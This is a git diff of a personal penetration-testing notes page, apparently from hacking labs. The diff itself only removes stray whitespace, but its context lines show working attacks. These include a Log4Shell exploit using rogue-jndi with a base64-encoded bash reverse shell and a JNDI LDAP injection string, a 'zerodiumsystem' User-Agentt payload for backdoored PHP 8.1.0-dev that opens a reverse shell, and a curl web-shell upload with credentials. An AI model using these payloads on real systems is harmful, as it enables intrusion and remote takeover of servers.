@@ -4,7 +4,7 @@ description: 'tl;dr: This page tracks things I have pwn''d before with public ex
 
 # Things I have Pwn'd before
 
-* `https://ippsec.rocks/?#`&#x20;
+* `https://ippsec.rocks/?#`
 
 ### Unifi Log4Shell
 
@@ -19,9 +19,9 @@ sudo tcpdump -i tun0 port 389
 
 <figure><img src="../.gitbook/assets/image (5) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
-* The server will response with `invalid payload` however it is still connecting back to us, check `tcpdump` to ensure the connect back&#x20;
+* The server will response with `invalid payload` however it is still connecting back to us, check `tcpdump` to ensure the connect back
 
-![](<../.gitbook/assets/image (7).png>)
+![](<../.gitbook/assets/image (7) (1).png>)
 
 * Now install the required packages:
 
@@ -35,8 +35,6 @@ mvn -v
 
 * After the payload has been created, start the Rogue-JNDI application while passing in the payload as part of the `--command` option and your tun0 IP address to the `--hostname` option.
 
-
-
 ```
 git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
 echo 'bash -c bash -i >&/dev/tcp/10.10.15.96/9001 0>&1' | base64
@@ -44,7 +42,7 @@ java -jar /opt/rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFz
 ```
 
 * `--hostname` is your localhost tun0 interface
-* &#x20;Now start your listener&#x20;
+* Now start your listener
 * Going back to our intercepted POST request, let's change the payload to `${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}` and click `Send`
 
 ### Apache Struts2
@@ -374,11 +372,11 @@ curl --user developers:9972761drmfsls -F "file=@shell.php" -F "plupload=1" -F "n
 
 * This version of php was backdoored
 * Detect with nikto or by capturing the server response in burp
-* `X-Powered-By: PHP 8/1/0/dev` --> what you are looking for&#x20;
+* `X-Powered-By: PHP 8/1/0/dev` --> what you are looking for
 * Automated POC exploit
-* [https://www.exploit-db.com/exploits/49933](https://www.exploit-db.com/exploits/49933)&#x20;
+* [https://www.exploit-db.com/exploits/49933](https://www.exploit-db.com/exploits/49933)
 * Manual Exploitation:
-* Capture a request in burp suite&#x20;
+* Capture a request in burp suite
 * Add additional `User-Agentt` header to the request (yes it is supposed to be spelled with two t's)
 * Payload:
 
@@ -395,4 +393,3 @@ User-Agentt: zerodiumsystem('bash -c "bash -i >& /dev/tcp/10.10.14.13/9001 0>&1"
 ```
  /opt/ona/www/local/config/database_settings.inc.php
 ```
-
